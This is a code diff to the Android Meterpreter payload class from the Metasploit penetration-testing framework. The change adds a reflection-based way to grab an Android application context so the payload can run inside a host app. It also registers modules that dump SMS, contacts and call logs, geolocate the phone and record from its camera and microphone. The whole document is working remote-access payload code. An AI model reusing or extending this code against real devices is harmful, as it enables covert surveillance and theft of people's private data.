@@ -1,12 +1,17 @@
 package com.metasploit.meterpreter;
 
-import java.io.DataInputStream;
-import java.io.File;
-import java.io.OutputStream;
-
 import android.content.Context;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
 
+import com.metasploit.meterpreter.android.check_root_android;
+import com.metasploit.meterpreter.android.dump_calllog_android;
+import com.metasploit.meterpreter.android.dump_contacts_android;
+import com.metasploit.meterpreter.android.dump_sms_android;
+import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
+import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
 import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
 import com.metasploit.meterpreter.android.webcam_audio_record_android;
 import com.metasploit.meterpreter.android.webcam_get_frame_android;
@@ -35,32 +40,66 @@ import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;
 
-import com.metasploit.meterpreter.android.check_root_android;
-import com.metasploit.meterpreter.android.dump_calllog_android;
-import com.metasploit.meterpreter.android.dump_contacts_android;
-import com.metasploit.meterpreter.android.dump_sms_android;
-import com.metasploit.meterpreter.android.geolocate_android;
-import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.OutputStream;
+import java.lang.reflect.Method;
 
 public class AndroidMeterpreter extends Meterpreter {
 
+    private static String writeableDir;
     private static Context context;
+
+    private void findContext() throws Exception {
+        final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        context = (Context) currentApplication.invoke(null, (Object[]) null);
+        Log.e(getClass().getName(), "context " + context);
+        if (context == null) {
+            Handler handler = new Handler(Looper.getMainLooper());
+            handler.post(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        context = (Context) currentApplication.invoke(null, (Object[]) null);
+                        Log.e(getClass().getName(), "curcontext " + context);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                    try {
+                        startExecuting();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            });
+        } else {
+            startExecuting();
+        }
+    }
 
     public static Context getContext() {
         return context;
     }
 
-    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Context context, boolean redirectErrors) throws Exception {
+    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, String[] parameters, boolean redirectErrors) throws Exception {
         super(in, rawOut, true, redirectErrors, false);
-        AndroidMeterpreter.context = context;
-        startExecuting();
+        writeableDir = parameters[0];
+        Log.e(getClass().getName(), "dir " + writeableDir);
+        try {
+            findContext();
+        } catch (Exception e) {
+            e.printStackTrace();
+            Log.e(getClass().getName(), "except " + e.toString());
+            startExecuting();
+        }
     }
 
     @Override
     public String[] loadExtension(byte[] data) throws Exception {
         getCommandManager().resetNewCommands();
         CommandManager mgr =  getCommandManager();
-        Loader.cwd = new File(".").getAbsoluteFile();
+        Loader.cwd = new File(writeableDir);
         mgr.registerCommand("channel_create_stdapi_fs_file", channel_create_stdapi_fs_file.class);
         mgr.registerCommand("channel_create_stdapi_net_tcp_client", channel_create_stdapi_net_tcp_client.class);
         mgr.registerCommand("channel_create_stdapi_net_tcp_server", channel_create_stdapi_net_tcp_server.class);
